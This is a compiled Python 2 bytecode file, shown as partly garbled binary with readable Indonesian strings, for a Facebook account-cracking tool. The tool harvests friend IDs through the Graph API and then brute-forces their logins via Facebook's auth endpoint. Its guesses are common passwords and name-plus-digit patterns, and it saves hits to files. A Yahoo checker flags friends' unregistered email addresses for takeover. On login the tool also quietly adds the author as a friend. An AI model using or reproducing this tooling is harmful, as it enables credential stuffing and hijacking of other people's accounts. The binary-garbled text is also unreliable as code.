ó
£^c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z y d  d l Z Wn e k
 rÐ e  j d  n Xy d  d l Z Wn% e k
 re  j d  e   n Xd  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d	 d$ g e _ d   Z d   Z  d   Z! d   Z" d   Z# d Z$ d   Z% d Z& g  Z' g  Z( g  a) g  a* g  Z+ g  Z, d   Z- d   Z. d   Z d   Z/ d   Z0 d   Z1 d   Z2 d   Z3 d   Z4 d   Z5 d   Z6 d   Z7 d    Z8 d!   Z9 d"   Z: e; d# k re/   e-   n  d S(%   iÿÿÿÿN(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   ib.pyt   keluar   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   ib.pyt   acak    s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR	   s   !%ss   %s;i   R
   s   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   ib.pyR   (   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   ib.pyt   Mengetik2   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸®?(   R   R   R   R   R   R   (   R   R   (    (    s   ib.pyt   jalan9   s    só  [1;91mââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬à¹à¹â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â
[1;92m  â    âââââââ    â    [1;94m
[1;92m âââ [1;94mâââââââââââ[1;92m âââ  [1;93mâ¢ FB  : fb.com/Rizky.Rasata
[1;92m     ââ âââââ ââ      [1;91mâ¢ WA  : 0895xxxxxxx
[1;92m   â âââââââââââ â    [1;96mâ¢ GB  : github.com/RKT1/new
[1;92m ââ    âââââââ    ââ  [1;95mâ¢ RC  : Muhammad Rizky
[1;97mââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬à¹à¹â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s"   [1;97m[â] [1;93mSedang masuk i   (   R   R   R   R   R   (   t   titikt   o(    (    s   ib.pyt   tikG   s
      i    c          C   s¨   t  j d  t GHd GHd GHd GHHt d  }  |  d k rI d GHt   n[ |  d k r_ t   nE |  d	 k ru t   n/ |  d
 k r t   n d GHt j	 d  t   d  S(   Nt   clears-   [1;91m[1;97m1.[1;96m Login via email/id fbs*   [1;91m[1;97m2.[1;96m Login via token fbs   [1;91m[1;97m0.[1;91m Keluars'   [1;92mï¸»ãâä¸â¸ [1;90m:[1;97m R
   s   [1;91m[!] Isi Yg Benar !t   1t   2t   0s   [1;91m[!] Isi Yang Benar !gffffffæ?(
   R   t   systemt   logot	   raw_inputt   masukt   logint   tokenzR   R   R   (   t   msuk(    (    s   ib.pyR,   V   s&    



c          C   sÎ   t  j d  t GHt d  }  y t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   d GHt  j d  t j d	  t   Wn* t k
 rÉ d
 GHt j d  t   n Xd  S(   NR%   s(   [1;97m[?] [1;96mToken[1;91m : [1;97ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;92m[â] Login Berhasil s,   xdg-open https://m.facebook.com/Rizky.Rasatai   s   [1;91m[!] Token salah !g333333û?(   R   R)   R*   R+   t   requestst   gett   jsont   loadst   textt   openR   t   closeR   R   t   menut   KeyErrorR,   (   t   tokett   otwt   at   namat   zedd(    (    s   ib.pyR.   m   s$    

c          C   sÈ  t  j d  y t d d  }  t   Wnt t f k
 rÃt  j d  t GHd GHd GHd GHd GHt d  } t d	  } t   y t	 j d
  Wn  t
 j k
 rµ d GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rey.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d  6| d 6d! d" 6d# d$ 6} t j d%  } | j |  | j   } | j i | d& 6 d' } t j | d( | } t j | j  }	 t d d)  }
 |
 j |	 d*  |
 j   d+ GHt j d, |	 d*  t  j d-  t   Wqet j  j! k
 rad. GHt   qeXn  d/ | k rd0 GHt  j d1  t" j# d2  t   qÄd3 GHt  j d1  t" j# d2  t$   n Xd  S(4   NR%   s	   login.txtt   rs:              [1;93mâ ï¸<><><><><><><><><><><><><><>â ï¸s-            [1;93m     LOGIN AKUN FACEBOOK ANDAs.              [1;93m  GUNAKAN AKUN FACEBOOK BARUs;              [1;93mâ ï¸<><><><><><><><><><><><><><>â ï¸
s+   [1;97m[+] [1;96mID/Email [1;91m=[1;92m s+   [1;97m[+] [1;96mPassword [1;91m=[1;92m s   https://mbasic.facebook.coms   
[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR&   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR(   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens#   
[1;97m[â] [1;92mLogin BerhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s,   xdg-open https://m.facebook.com/Rizky.Rasatas$   
[1;96m[!] [1;91mTidak ada koneksit
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints   rm -rf login.txti   s'   [1;97m
[!] [1;91mPassword/Email salah(%   R   R)   R6   R8   R9   t   IOErrorR*   R+   R$   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR1   R2   R3   R4   R5   R   R7   t   postt
   exceptionsR   R   R   R,   (   R:   t   idt   pwdt   urlRQ   t   dataR   R<   R?   R   t   unikers(    (    s   ib.pyR-      sn    
S

c          C   sh  t  j d  y t d d  j   }  Wn2 t k
 rZ t  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnf t k
 rÞ t  j d  d GHt  j d  t j d	  t   n# t j j k
 r d
 GHt   n Xt  j d  t GHd d GHd | d GHd | d GHd d GHd GHd GHd GHd GHd GHd GHt   d  S(   NR%   s	   login.txtR?   s   rm -rf login.txts+   https://graph.facebook.com/me?access_token=R0   Rf   s   [1;96m[!] [1;91mToken invalidi   s#   [1;96m[!] [1;91mTidak ada koneksii6   s	   [1;95mÃ·s,   [1;93m[â] [1;97mNama [1;91m: [1;92mãs   ã[1;97m                  s)   [1;93m[â] [1;97mID   [1;91m: [1;92ms   [1;97m              s$   [1;92m1.[1;97m Crack id indonesia s.   [1;92m2.[1;97m Crack id bangladesh/pakistan s   [1;92m3.[1;97m Yahoo checker s(   [1;92m4.[1;97m Ikuti saya di facebook s   [1;92m5.[1;97m Info crack s$   
[1;97m0.[1;91m Logout            (   R   R)   R6   t   readRU   R,   R1   R2   R3   R4   R5   R9   R   R   Re   R   R   R*   t   pilih(   R:   R;   R<   R=   Rf   (    (    s   ib.pyR8   ½   sD    

		c          C   sß   t  d  }  |  d k r' d GHt   n´ |  d k r= t   n |  d k rS t   n |  d k ri t   nr |  d k r t   n\ |  d k r t   nF |  d	 k rÏ t j d
  t	 d  t j d  t
   n d GHt   d  S(   Ns(   
[1;92mï¸»ãâä¸â¸ [1;90m: [1;97mR
   s    [1;97m[!] [1;91mIsi yang benarR&   R'   t   3t   4t   5R(   R%   s   Menghapus tokens   rm -rf login.txt(   R+   Rl   t   supert
   Bangladesht
   menu_yahoot   rizkyt
   info_crackR   R)   R!   R   (   Rj   (    (    s   ib.pyRl   â   s*    







c           C   s   t  j d  t   d  S(   Ns,   xdg-open https://m.facebook.com/Rizky.Rasata(   R   R)   R8   (    (    (    s   ib.pyRs   ü   s    c           C   sà   t  j d  t GHd GHt d  t d  t d  t d  t d  t d  t d	  t d
  t d  t d  t d  t d  t d  t d  t d  t d	  t d  t d  t d  t   d  S(   NR%   s2       ++++++++++++++++ INFO CRACK ++++++++++++++++ 
s1    [1;92m              PASSWORD LIST INDONESIA   
s   [1;93m1. Sayangs	   2. Anjings	   3. Kontols   4. Nama Depan + 123s   5. Nama Depan + 1234s   6. Nama Depan + 12345s
   7. Bangsats   8. Nama Belakang + 123
s7   [1;92m           PASSWORD LIST BANGLADESH/PAKISTAN   
s   [1;93m1. 786786s   2. Bangladeshs   3. Nama Belakang + 1234s   7. Nama Belakang + 123s   8. Pakistans!   
[1;96m[[1;97m Kembali [1;96m](   R   R)   R*   R    R+   R8   (    (    (    s   ib.pyRt     s.    


















c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHt
   d  S(
   NR%   s	   login.txtR?   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s(   [1;97m1.[1;96m Crack dari daftar temans+   [1;97m2.[1;96m Crack dari id publik/temans   
[1;97m0.[1;91m Kembali(   R   R)   R6   Rk   R:   RU   R   R   R   R*   t   pilih_super(    (    (    s   ib.pyRp     s    c          C   s  t  d  }  |  d k r' d GHt   n|  d k r t j d  t GHd d GHt j d t  } t j	 | j
  } x9| d	 D] } t j | d
  q~ Wn|  d k rt j d  t GHd d GHt  d  } y> t j d | d t  } t j	 | j
  } d | d GHWn' t k
 r6d GHt  d  t   n Xt j d | d t  } t j	 | j
  } xH | d	 D] } t j | d
  qoWn" |  d k r£t   n d GHt   d t t t   GHd d d g } x0 | D]( }	 d |	 Gt j j   t j d  qÚWHd GHd GHd d GHd   }
 t d  } | j |
 t  Hd GHd  t t t   d! t t t   GHd" GHt  d#  t j d$  d  S(%   Ns(   
[1;92mï¸»ãâä¸â¸ [1;90m: [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR&   R%   i(   s
   [1;92mâ¢s3   https://graph.facebook.com/me/friends?access_token=Ri   Rf   R'   s2   [1;97m[+] [1;96mID publik/teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s)   [1;97m[â][1;96m Nama[1;91m :[1;97m R0   s,   [1;96m[!] [1;91mID publik tidak ditemukan!s   
[1;97m[ Kembali ]s   /friends?access_token=R(   s+   [1;97m[+] [1;96mTotal ID [1;91m: [1;97ms   .   s   ..  s   ... s+   [1;97m[â¸][1;96m Crack Berjalan [1;97mi   s   [1;97m[!] [1;96mStop CTRL+Zs0   [1;97m[~][1;96m Hasil akan muncul di bawah !!!c         S   sD  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÀ d	 | d
 | GHt j | |  nud | d k r'd | d
 | GHt d d  } | j | d | d  | j   t j | |  n| d d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  n¡d | d k rûd | d
 | GHt d d  } | j | d | d  | j   t j | |  n:| d d }	 t	 j
 d | d |	 d  } t j |  } d | k rhd	 | d
 |	 GHt j | |	  nÍd | d k rÏd | d
 |	 GHt d d  } | j | d |	 d  | j   t j | |	  nfd }
 t	 j
 d | d |
 d  } t j |  } d | k r4d	 | d
 |
 GHt j | |
  nd | d k rd | d
 |
 GHt d d  } | j | d |
 d  | j   t j | |
  n| d d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  n-d | d k rod | d
 | GHt d d  } | j | d | d  | j   t j | |  nÆ| d d } t	 j
 d | d | d  } t j |  } d | k rÜd	 | d
 | GHt j | |  nYd | d k rCd | d
 | GHt d d  } | j | d | d  | j   t j | |  nòt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÕd	 | d
 | GHt j | |  n d | d k r<d | d
 | GHt d d  } | j | d | d  | j   t j | |  n t j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÎd	 | d
 | GHt j | |  ng d | d k r5d | d
 | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t   Sayangs   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RS   s#   [1;96m[ [1;92mOK[1;96m ][1;92m s    | s   www.facebook.comt	   error_msgs#   [1;96m[ [1;93mCP[1;96m ][1;93m s   out/indo.txtR<   t   |s   
t
   first_namet   123t   1234t   Anjingt   12345t	   last_namet   Kontolt   Bangsat(   R   t   mkdirt   OSErrorR1   R2   R:   R3   R4   R5   t   urllibt   urlopent   loadt   okst   appendR6   R   R7   t   cekpoint(   t   argt   userR<   t   bt   p1Ri   t   qt   cekt   p2t   p3t   p4t   p5t   p6t   p7t   p8(    (    s   ib.pyt   mainZ  sÜ    







i   s'   [1;96m[â] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93ms@   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/indo.txts!   
[1;96m[[1;97m Kembali [1;96m]s   python2 new.py(   R+   Ru   R   R)   R*   R1   R2   R:   R3   R4   R5   Rf   R   R9   Rp   R8   R   R   R   R   R   R   R   R    t   mapR   R   (   t   peakR?   R   t   st   idtt   jokt   opR   R"   R#   R   t   p(    (    s   ib.pyRu   ,  sh    
		

  		)
c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHt
   d  S(
   NR%   s	   login.txtR?   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s(   [1;97m1.[1;92m Crack dari daftar temans+   [1;97m2.[1;92m Crack dari id publik/temans   
[1;97m0.[1;91m Kembali(   R   R)   R6   Rk   R:   RU   R   R   R   R*   t   super_bangla(    (    (    s   ib.pyRq   ê  s    c          C   s  t  d  }  |  d k r' d GHt   n|  d k r t j d  t GHd d GHt j d t  } t j	 | j
  } x9| d	 D] } t j | d
  q~ Wn|  d k rt j d  t GHd d GHt  d  } y> t j d | d t  } t j	 | j
  } d | d GHWn' t k
 r6d GHt  d  t   n Xt j d | d t  } t j	 | j
  } xH | d	 D] } t j | d
  qoWn" |  d k r£t   n d GHt   d t t t   GHd d d g } x0 | D]( }	 d |	 Gt j j   t j d  qÚWHd GHd GHd d GHd   }
 t d   } | j |
 t  Hd! GHd" t t t   d# t t t   GHd$ GHt  d  t j d%  d  S(&   Ns(   
[1;92mï¸»ãâä¸â¸ [1;90m: [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR&   R%   i,   s
   [1;96mâ¢s3   https://graph.facebook.com/me/friends?access_token=Ri   Rf   R'   s
   [1;92mâ¢s2   [1;97m[+] [1;96mID publik/teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s)   [1;97m[â][1;96m Nama[1;91m :[1;97m R0   s,   [1;96m[!] [1;91mID publik tidak ditemukan!s!   
[1;96m[[1;97m Kembali [1;96m]s   /friends?access_token=R(   s+   [1;97m[+] [1;96mTotal ID [1;91m: [1;97ms   .   s   ..  s   ... s+   [1;97m[â¸][1;96m Crack Berjalan [1;97mi   s   [1;97m[!] [1;96mStop CTRL+Zs0   [1;97m[~][1;96m Hasil akan muncul di bawah !!!i(   c         S   sL  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÀ d	 | d
 | GHt j | |  n}d | d k r'd | d
 | GHt d d  } | j | d | d  | j   t j | |  n| d d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  n©d | d k rûd | d
 | GHt d d  } | j | d | d  | j   t j | |  nB| d d }	 t	 j
 d | d |	 d  } t j |  } d | k rhd	 | d
 |	 GHt j | |	  nÕd | d k rÏd | d
 |	 GHt d d  } | j | d |	 d  | j   t j | |	  nnd }
 t	 j
 d | d t d  } t j |  } d | k r4d	 | d
 t GHt j | t  n	d | d k rd | d
 t GHt d d  } | j | d t d  | j   t j | t  n¢| d d } t	 j
 d | d t d  } t j |  } d | k rd	 | d
 t GHt j | t  n5d | d k rod | d
 t GHt d d  } | j | d t d  | j   t j | t  nÎ| d d } t	 j
 d | d t d  } t j |  } d | k rÜd	 | d
 t GHt j | t  nad | d k rCd | d
 t GHt d d  } | j | d t d  | j   t j | t  nút j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÕd	 | d
 | GHt j | |  n d | d k r<d | d
 | GHt d d  } | j | d | d  | j   t j | |  n t j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d | k rÖd	 | d
 | GHt j | |  ng d | d k r=d | d
 | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   NRv   s   https://graph.facebook.com/s   /?access_token=t   786786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RS   s#   [1;96m[ [1;92mOK[1;96m ][1;92m s    | s   www.facebook.comRx   s#   [1;96m[ [1;94mCP[1;96m ][1;94m s   out/bangla_pakis.txtR<   Ry   s   
Rz   R{   R|   t   PakistanR~   R   Rq   (   R   R   R   R1   R2   R:   R3   R4   R5   R   R   R   R   R   R6   R   R7   R   t   s4t   s5t   s6(   R   R   R<   R   t   s1Ri   R   R   t   s2t   s3R   R   R   t   s7t   s8(    (    s   ib.pyR   (  sÜ    







i   s'   [1;96m[â] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msH   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/bangla_pakis.txts   python2 new.py(   R+   Ru   R   R)   R*   R1   R2   R:   R3   R4   R5   Rf   R   R9   Rq   R8   R   R   R   R   R   R   R   R    R   R   R   (   R   R?   R   R   R   R   R   R   R"   R#   R   R   (    (    s   ib.pyR   û  sh    
		

  		)
c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHHt
   d  S(
   NR%   s	   login.txtR?   s   [1;91m[!] Token not founds   rm -rf login.txti   s(   [1;92m1.[1;97m Clone dari daftar temans+   [1;92m2.[1;97m Clone dari id publik/temans   [1;91m0.[1;97m Back(   R   R)   R6   Rk   R:   RU   R   R   R-   R*   t   yahoo_pilih(    (    (    s   ib.pyRr   ³  s    c          C   sy   t  d  }  |  d k r' d GHt   nN |  d k r= t   n8 |  d k rS t   n" |  d k ri t   n d GHt   d  S(   Ns'   [1;92mï¸»ãâä¸â¸ [1;90m:[1;97m R
   s   [1;91m[!] ISI YG BENAR !R&   R'   R(   (   R+   Rª   t   yahoofriendst   yahoofromfriendsR8   (   t   go(    (    s   ib.pyRª   Æ  s    



c          C   sÜ  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } d	 d
 GHt d  t j d t  } t j | j  } t d d  } t d  d GHd	 d
 GHx| d D]~} | d 7} |  j |  | d } | d } t j d | d t  } t j | j  }	 y|	 d }
 t j d  } | j |
  j   } d | k rvt j d  t t j _ t j d d  |
 t d <t j   j   } t j d  } y | j |  j   } Wn
 wn Xd | k rv| j |
 d  d GHd  | GHd! |
 GHd" | d GHt j |
  qvn  Wqt k
 rqXqWd# d$ GHd% GHd& t  t! t   GHd' GH| j"   t# d(  t  j d)  d  S(*   NR%   s	   login.txtR?   s   [1;91m[!] Token not founds   rm -rf login.txti   Rv   i    i,   s
   [1;90mâ¢s4   [1;97m[âº] [1;96mMengambil email teman [1;90m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s$   [1;97m[â¢] [1;96mMulai [1;97m...s   [1;97m[!] [1;93mStop CTRL+ZRi   Rf   R0   s   https://graph.facebook.com/s   ?access_token=RA   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR@   t   usernames$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s'   [1;97m[[1;92mâ[1;97m][1;92m VULN s7   [1;97m[[1;96mN[1;97m] [1;96mNama   [1;91m: [1;96ms9   [1;97m[[1;92mâ¬[1;97m] [1;92mEmail  [1;91m: [1;92ms9   [1;97m[[1;93mâ¹[1;97m] [1;93mID     [1;91m: [1;93mi(   s
   [1;96mâ¢s5   [1;91m[[1;96mâ[1;91m] [1;92mSelesai [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97ms=   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/MailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m]s   python2 new.py($   R   R)   R6   Rk   R:   RU   R   R   R-   R   R   R*   R!   R1   R2   R3   R4   R5   R   t   ret   compilet   searcht   groupRV   RY   RZ   R[   R\   R^   R   t   berhasilR9   R   R   R7   R+   (   t   mpsht   jmlt   temant   kimakt   saveR   Rf   R=   t   linksR   t   mailt   yahooR;   t   klikR   t   pek(    (    s   ib.pyR«   Ö  s|    	

	




			

c          C   s.  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d
 | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d }	 | d }
 t j d
 |	 d t  } t j | j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d d  | t d <t j   j   } t j d  } y | j |  j   } Wn
 w{n Xd  | k rÑ| j  | d!  d" | d# |
 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd$ GHd% t" t# t!   GHd& GH| j$   t d'  t  j d(  d  S()   NR%   s	   login.txtR?   s   [1;91m[!] Token Invalid !s   rm -rf login.txti   Rv   i    s2   [1;97m[+] [1;96mID teman/publik [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s)   [1;97m[â] [1;96mNama[1;91m :[1;97m R0   s*   [1;91m[!] ID teman/publik tidak ditemukans!   
[1;96m[ [1;97mKembali [1;96m]s.   [1;97m[âº] [1;96mMengambil email [1;97m...s   /friends?access_token=s   out/FriendMailVuln.txtR   s$   [1;97m[âº] [1;96mMulai [1;97m...i,   s
   [1;96mâ¢Ri   Rf   RA   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR@   R®   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s5   [1;91m[[1;96mâ[1;91m] [1;92mSelesai [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msC   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FriendMailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m]s   python2 new.py(%   R   R)   R6   Rk   R:   RU   R   R   R-   R   R   R*   R+   R1   R2   R3   R4   R5   R9   Rr   R!   R   R¯   R°   R±   R²   RV   RY   RZ   R[   R\   R^   R   R³   R   R   R7   (   R´   Rµ   R   R   R   R¶   R·   R¸   R   Rf   R=   R¹   R   Rº   R»   R;   R¼   R½   (    (    s   ib.pyR¬     s    


	






t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(<   R   R   R   t   datetimeR   R`   R¯   t	   threadingR3   t   getpassR   t	   cookielibt   multiprocessing.poolR    RW   t   ImportErrorR)   R1   R-   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRV   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R!   R*   R$   t   backt   threadsR³   R   R   Rf   t   listgrupR,   R.   R8   Rl   Rs   Rt   Rp   Ru   Rq   R   Rr   Rª   R«   R¬   t   __name__(    (    (    s   ib.pyt   <module>   sd   
			
						<	%					¾		¸			B	F